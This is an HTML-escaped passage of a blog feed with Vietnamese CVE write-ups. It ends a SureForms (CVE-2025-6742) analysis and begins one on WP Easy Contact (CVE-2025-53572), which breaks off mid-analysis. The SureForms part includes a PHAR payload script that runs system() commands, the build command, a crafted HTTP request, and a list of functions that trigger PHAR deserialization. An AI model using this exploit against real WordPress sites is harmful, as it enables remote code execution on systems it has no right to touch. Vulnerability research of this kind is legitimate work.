&lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Khi đã debug được rồi thì ta sẽ thấy luồng dẫn tới sink:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Client submit form&amp;#34;] &#xA;    --&amp;gt; B[&amp;#34;Admin delete entry&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;WordPress hook: admin_init&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;handle_entry_actions&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Entries_List_Table::handle_entry_status()&amp;#34;]&#xA;E -- $action=delete --&amp;gt; F[&amp;#34;Entries_List_Table::delete_entry_files()&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;$value is array&amp;#34;}&#xA;G -- Yes --&amp;gt; H[&amp;#34;call file_exists( $file_path )&amp;#34;] --&amp;gt; L[&amp;#34;RCE: PHAR Deserialization&amp;#34;]&#xA;G -- No --&amp;gt; K[&amp;#34;continue&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Sử dụng admin account để tạo form và thêm vào post&lt;/li&gt;&#xA;&lt;li&gt;Tạo 1 PHP file &lt;code&gt;create_phar.php&lt;/code&gt; với code sau:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;// Định nghĩa class Evil với thuộc tính và hàm __wakeup&#xA;class Evil&#xA;{&#xA;    // Thuộc tính command chứa lệnh hệ thống sẽ thực thi&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;&#xA;    // Hàm __wakeup() được gọi khi object này bị unserialize&#xA;    public function __wakeup(): void&#xA;    {&#xA;        // Khi unserialize, sẽ thực thi lệnh trong $command và dừng chương trình&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&#xA;&#xA;// Tạo một file PHAR mới tên poc.phar&#xA;$phar = new Phar(&amp;#39;poc.phar&amp;#39;);&#xA;&#xA;// Bắt đầu ghi dữ liệu vào PHAR (buffering)&#xA;$phar-&amp;gt;startBuffering();&#xA;&#xA;// Thêm một entry giả tên test.png với nội dung &amp;#34;text&amp;#34;&#xA;$phar-&amp;gt;addFromString(&amp;#39;test.png&amp;#39;, &amp;#39;text&amp;#39;);&#xA;&#xA;// Đặt stub cho PHAR: bắt đầu bằng magic bytes của PNG để giả dạng file ảnh,&#xA;// sau đó có đoạn PHP __HALT_COMPILER() để đánh dấu kết thúc stub&#xA;$phar-&amp;gt;setStub(&amp;#34;\x89PNG\r\n\x1a\n&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;);&#xA;&#xA;// Ghi metadata vào PHAR: ở đây là một object Evil đã khởi tạo&#xA;// Metadata sẽ được serialize, và nếu bị unserialize sẽ kích hoạt __wakeup()&#xA;$phar-&amp;gt;setMetadata(new Evil());&#xA;&#xA;// Kết thúc ghi, flush dữ liệu ra file poc.phar&#xA;$phar-&amp;gt;stopBuffering();&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Tạo PHAR file &lt;code&gt;poc.phar&lt;/code&gt; bằng cách chạy  &lt;code&gt;php --define phar.readonly=0 create_phar.php&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;phar.readonly&lt;/code&gt; là một directive trong PHP (cấu hình của extension Phar). Mặc định giá trị của nó là 1 (readonly) không thể tạo file. Khi muốn tạo file PHAR, cần tắt chế độ readonly bằng cách thêm option &lt;code&gt;phar.readonly=0&lt;/code&gt; hoặc cấu hình trong &lt;code&gt;php.ini&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Đổi tên &lt;code&gt;poc.phar&lt;/code&gt; thành &lt;code&gt;poc.png&lt;/code&gt; vì thông thường các trường hợp sẽ chấp nhận upload file ảnh thay vì &lt;code&gt;.phar&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Upload &lt;code&gt;poc.jpg&lt;/code&gt; bằng Trình chỉnh sửa phương tiện. Lưu ý đường dẫn của nó trong &lt;code&gt;wp-content/uploads&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Gửi lại request submit form:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0&#xA;Accept: application/json, */*;q=0.1&#xA;Accept-Language: en-US,en;q=0.7,vi;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/2025/11/19/form-testing/&#xA;X-WP-Nonce: 2c506366a5&#xA;Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Length: 775&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Cookie: wp-settings-time-3=1763365761&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;sureforms_form_submit&amp;#34;&#xA;&#xA;d3b9273370&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;_wp_http_referer&amp;#34;&#xA;&#xA;/2025/11/19/form-testing/&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;form-id&amp;#34;&#xA;&#xA;123&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-sender-email-field&amp;#34;&#xA;&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]&amp;#34;&#xA;&#xA;phar://../wp-content/uploads/2025/11/poc.png&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221--&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Khi admin xóa entry đã upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/result.png&#34; title=&#34;RCE khi admin xóa entry&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE khi admin xóa entry&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/result.png&#39; alt=&#34;Result&#34; height=&#34;841&#34; width=&#34;1486&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE khi admin xóa entry&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Cảnh báo&lt;/p&gt;&lt;p&gt;Sau khi thử nhiều phiên bản PHP khác nhau, tôi nhận thấy rằng: Hàm &lt;code&gt;file_exists()&lt;/code&gt; chỉ hoạt động ở các phiên bản &lt;code&gt;&amp;lt;=7.4&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Một số hàm khác dùng để khai thác PHAR Deserialization:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;copy                file_exists         file_get_contents   file_put_contents   &#xA;file                fileatime           filectime           filegroup           &#xA;fileinode           filemtime           fileowner           fileperms           &#xA;filesize            filetype            fopen               is_dir              &#xA;is_executable       is_file             is_link             is_readable         &#xA;is_writable         lstat               mkdir               parse_ini_file      &#xA;readfile            rename              rmdir               stat                &#xA;touch               unlink  &lt;/code&gt;&lt;/pre&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;PHP Object Injection trong SureForm &amp;lt;= 1.7.3&lt;/strong&gt; xuất phát từ việc sử dụng &lt;code&gt;file_exists()&lt;/code&gt; và &lt;code&gt;unlink()&lt;/code&gt; trực tiếp trên đường dẫn được kiểm soát bởi user mà không có ràng buộc phạm vi truy cập file. Tuy không có POP chain sẵn trong plugin, nhưng nếu hệ thống cài đặt thêm plugin hoặc theme có POP chain, kẻ tấn công có thể mở rộng mức độ khai thác đến xóa file, đọc dữ liệu nhạy cảm hoặc thậm chí thực thi mã (RCE). Bản vá 1.7.4 xử lý vấn đề bằng việc chuẩn hoá và giới hạn đường dẫn file vào thư mục upload hợp lệ nhằm loại bỏ vector khai thác.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lỗi phát sinh từ việc thao tác file trực tiếp dựa trên input người dùng chưa kiểm soát.&lt;/li&gt;&#xA;&lt;li&gt;Việc chỉ dùng &lt;code&gt;file_exists()&lt;/code&gt; có thể dẫn đến PHAR deserialization trên PHP ≤7.4.&lt;/li&gt;&#xA;&lt;li&gt;Dù plugin không có POP chain sẵn, môi trường WordPress thường cài nhiều plugin → khả năng ghép chain rất cao.&lt;/li&gt;&#xA;&lt;li&gt;Bản vá thêm kiểm tra chuẩn hóa đường dẫn, giới hạn phạm vi file và tránh sử dụng trực tiếp path đến filesystem.&lt;/li&gt;&#xA;&lt;li&gt;Các hàm file-operation luôn tiềm ẩn nguy cơ khai thác nếu input không được kiểm soát chặt chẽ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/sureforms/vulnerability/wordpress-sureforms-plugin-1-7-3-unauthenticated-php-object-injection-phar-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress SureForm Plugin &amp;lt;= 1.7.3 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53572 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-18-cve-2025-53572/</link>
      <pubDate>Tue, 18 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-18-cve-2025-53572/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; trong &lt;strong&gt;emarket-design WP Easy Contact&lt;/strong&gt; cho phép &lt;strong&gt;Object Injection&lt;/strong&gt;.&lt;br&gt;&#xA;Vấn đề này ảnh hưởng đến &lt;strong&gt;WP Easy Contact&lt;/strong&gt;: từ &lt;em&gt;n/a&lt;/em&gt; đến &lt;strong&gt;4.0.1&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53572&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53572&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.0.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-easy-contact/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Easy Contact Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WP Easy Contact&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xuất phát từ việc cho phép attacker khởi tạo đối tượng tùy ý từ input → &lt;strong&gt;PHP Object Injection&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$widg_arr = explode(&amp;#34;-&amp;#34;,$div_id);&#xA;$mywidg = new $widg_arr[1]();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá bổ sung whitelist và sanitize input → chỉ cho phép khởi tạo class hợp lệ, loại bỏ lỗ hổng.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-11-18-cve-2025-53572/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-18-cve-2025-53572/diff.png&#39; alt=&#34;Diff&#34; height=&#34;766&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký một Ajax cho unauthenticated user 